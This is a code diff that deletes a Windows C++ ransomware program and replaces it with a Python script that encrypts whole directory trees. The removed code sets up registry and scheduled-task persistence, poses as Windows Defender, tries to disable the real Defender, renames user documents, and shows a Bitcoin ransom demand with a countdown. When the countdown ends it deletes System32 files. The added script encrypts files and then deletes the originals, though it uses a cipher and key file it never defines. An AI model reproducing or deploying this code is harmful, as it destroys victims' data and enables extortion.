@@ -1,211 +1,53 @@
-#include <windows.h>
-#include <string>
-#include <fstream>
-#include <vector>
-#include <ctime>
-#include <direct.h>
-#include <ShlObj.h>
-#include <wincrypt.h>
-#include <commctrl.h>
-#include <tlhelp32.h>
+import os
+from cryptography.fernet import Fernet
+from pathlib import Path
 
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "user32.lib")
-#pragma comment(lib, "comctl32.lib")
-#pragma comment(lib, "crypt32.lib")
-
-#define ID_TIMER 1
-#define RANSOM_HOURS 48
-
-// Global variables
-HWND g_hWnd;
-HBITMAP g_hLogoBitmap = NULL;
-int g_hoursRemaining = RANSOM_HOURS;
-
-// Function declarations
-void EnsureImmediateStart();
-void SpoofDefenderIdentity();
-void EncryptFiles();
-void DeleteSystemFiles();
-void UpdateTimerDisplay();
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
-HBITMAP CreateSkullLogo();
-
-// Create a simple bitmap with a skull for logo (placeholder for real image)
-HBITMAP CreateSkullLogo() {
-    HDC hdc = CreateCompatibleDC(NULL);
-    HBITMAP hBitmap = CreateBitmap(100, 100, 1, 32, NULL);
-    SelectObject(hdc, hBitmap);
-    HBRUSH hBrush = CreateSolidBrush(RGB(0, 255, 0)); // Green background like Defender
-    RECT rect = {0, 0, 100, 100};
-    FillRect(hdc, &rect, hBrush);
-    DeleteObject(hBrush);
-    // Draw skull text (simplified, real implementation would use a pre-rendered image)
-    SetTextColor(hdc, RGB(255, 255, 255));
-    TextOutA(hdc, 30, 40, "SKULL", 5);
-    DeleteDC(hdc);
-    return hBitmap;
+# Define the list of files to exclude from encryption
+EXCLUDED_FILES = {
+    "windows-defender.png",
+    "windows-defender.exe",
+    "Windows-defender.def",
+    "windows-defender.pap",
+    "windows-defender-license.txt",
+    "license"
 }
 
-// Ensure ransomware starts immediately and persists
-void EnsureImmediateStart() {
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    std::string fakePath = "C:\\Program Files\\Windows Defender\\MsMpEng.exe";
+# Function to encrypt a file
+def encrypt_file(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        encrypted_data = cipher.encrypt(file_data)
+        # Write the encrypted data back to the file with a new extension
+        encrypted_file_path = f"{file_path}.encrypted"
+        with open(encrypted_file_path, "wb") as file:
+            file.write(encrypted_data)
+        # Optionally, remove the original file after encryption
+        os.remove(file_path)
+        print(f"Encrypted: {file_path} -> {encrypted_file_path}")
+    except Exception as e:
+        print(f"Error encrypting {file_path}: {str(e)}")
 
-    // Copy to fake Defender path
-    CopyFileA(exePath, fakePath.c_str(), FALSE);
+# Function to walk through directories and encrypt files
+def encrypt_directory(directory_path):
+    for root, dirs, files in os.walk(directory_path):
+        for file_name in files:
+            # Check if the file is in the excluded list
+            if file_name in EXCLUDED_FILES:
+                print(f"Skipped (excluded): {file_name}")
+                continue
+            # Check if the file is already encrypted
+            if file_name.endswith(".encrypted"):
+                print(f"Skipped (already encrypted): {file_name}")
+                continue
+            # Get the full file path
+            file_path = os.path.join(root, file_name)
+            encrypt_file(file_path)
 
-    // Add to startup registry
-    HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-    RegSetValueExA(hKey, "WindowsDefenderCore", 0, REG_SZ, (BYTE*)fakePath.c_str(), fakePath.size() + 1);
-    RegCloseKey(hKey);
-
-    // Create scheduled task for immediate start
-    std::string cmd = "schtasks /create /tn \"DefenderUpdate\" /tr \"" + fakePath + "\" /sc onstart /ru SYSTEM";
-    system(cmd.c_str());
-    system("schtasks /run /tn \"DefenderUpdate\"");
-
-    // Ensure only one instance runs
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe32 = { sizeof(pe32) };
-    DWORD currentPid = GetCurrentProcessId();
-    int count = 0;
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            if (strcmp(pe32.szExeFile, "MsMpEng.exe") == 0 && pe32.th32ProcessID != currentPid) {
-                count++;
-            }
-        } while (Process32Next(hSnapshot, &pe32));
-    }
-    CloseHandle(hSnapshot);
-    if (count > 0) ExitProcess(0); // Exit if already running
-}
-
-// Spoof Windows Defender identity
-void SpoofDefenderIdentity() {
-    std::string fakePath = "C:\\Program Files\\Windows Defender\\MsMpEng.exe";
-    HKEY hKey;
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
-    RegSetValueExA(hKey, "FakeDefender", 0, REG_SZ, (BYTE*)fakePath.c_str(), fakePath.size() + 1);
-    RegCloseKey(hKey);
-    // Attempt to disable real Defender (may require elevation)
-    HKEY hPolicyKey;
-    DWORD disable = 1;
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, 0, KEY_WRITE, NULL, &hPolicyKey, NULL);
-    RegSetValueExA(hPolicyKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-    RegCloseKey(hPolicyKey);
-}
-
-// Basic file encryption (simplified AES placeholder)
-void EncryptFiles() {
-    char docPath[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath);
-    std::string searchPath = std::string(docPath) + "\\*.*";
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                std::string filePath = std::string(docPath) + "\\" + findData.cFileName;
-                std::string encryptedPath = filePath + ".locked";
-                // Placeholder encryption: just rename and append .locked
-                CopyFileA(filePath.c_str(), encryptedPath.c_str(), FALSE);
-                DeleteFileA(filePath.c_str());
-            }
-        } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
-    }
-}
-
-// Delete system files on timeout
-void DeleteSystemFiles() {
-    std::string sysPath = "C:\\Windows\\System32\\*.*";
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(sysPath.c_str(), &findData);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                std::string filePath = "C:\\Windows\\System32\\" + std::string(findData.cFileName);
-                DeleteFileA(filePath.c_str());
-            }
-        } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
-    }
-}
-
-// Update timer display in GUI
-void UpdateTimerDisplay() {
-    char timerText[32];
-    sprintf_s(timerText, "Time Left: %02d:00:00", g_hoursRemaining);
-    SetDlgItemTextA(g_hWnd, 102, timerText);
-    if (g_hoursRemaining <= 0) {
-        DeleteSystemFiles();
-        KillTimer(g_hWnd, ID_TIMER);
-    }
-}
-
-// Window Procedure for GUI
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-    switch (uMsg) {
-    case WM_CREATE: {
-        g_hLogoBitmap = CreateSkullLogo();
-        CreateWindowA("STATIC", NULL, WS_VISIBLE | WS_CHILD | SS_BITMAP, 20, 20, 100, 100, hwnd, (HMENU)100, NULL, NULL);
-        SendDlgItemMessageA(hwnd, 100, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)g_hLogoBitmap);
-        CreateWindowA("STATIC", "CRITICAL ALERT: System infected. Pay $500 Bitcoin in 48h or lose files.", WS_VISIBLE | WS_CHILD, 130, 30, 400, 60, hwnd, (HMENU)101, NULL, NULL);
-        CreateWindowA("STATIC", "Time Left: 48:00:00", WS_VISIBLE | WS_CHILD, 130, 100, 200, 20, hwnd, (HMENU)102, NULL, NULL);
-        CreateWindowA("BUTTON", "Pay Ransom Now", WS_VISIBLE | WS_CHILD, 130, 150, 150, 30, hwnd, (HMENU)103, NULL, NULL);
-        SetTimer(hwnd, ID_TIMER, 3600000, NULL); // Timer ticks every hour
-        break;
-    }
-    case WM_TIMER:
-        g_hoursRemaining--;
-        UpdateTimerDisplay();
-        break;
-    case WM_COMMAND:
-        if (LOWORD(wParam) == 103) {
-            MessageBoxA(hwnd, "Send $500 to Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "Payment Instructions", MB_OK);
-        }
-        break;
-    case WM_DESTROY:
-        if (g_hLogoBitmap) DeleteObject(g_hLogoBitmap);
-        PostQuitMessage(0);
-        break;
-    default:
-        return DefWindowProc(hwnd, uMsg, wParam, lParam);
-    }
-    return 0;
-}
-
-// Main entry point
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Step 1: Ensure immediate start and persistence
-    EnsureImmediateStart();
-
-    // Step 2: Spoof Windows Defender identity
-    SpoofDefenderIdentity();
-
-    // Step 3: Encrypt user files
-    EncryptFiles();
-
-    // Step 4: Create fake Windows Defender GUI
-    const char* className = "FakeDefenderWindow";
-    WNDCLASSA wc = { 0 };
-    wc.lpfnWndProc = WindowProc;
-    wc.hInstance = hInstance;
-    wc.lpszClassName = className;
-    RegisterClassA(&wc);
-
-    g_hWnd = CreateWindowExA(0, className, "Windows Defender Security Center", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 600, 400, NULL, NULL, hInstance, NULL);
-    ShowWindow(g_hWnd, nCmdShow);
-
-    // Step 5: Message loop
-    MSG msg = { 0 };
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    return 0;
-}
+if __name__ == "__main__":
+    # Specify the directory to start encryption (e.g., current directory)
+    target_directory = input("Enter the directory path to encrypt (default is current directory): ") or os.getcwd()
+    print(f"Starting encryption process in: {target_directory}")
+    encrypt_directory(target_directory)
+    print("Encryption process completed.")
+    print(f"Encryption key saved to: {KEY_FILE}. Keep this secure to decrypt files later.")
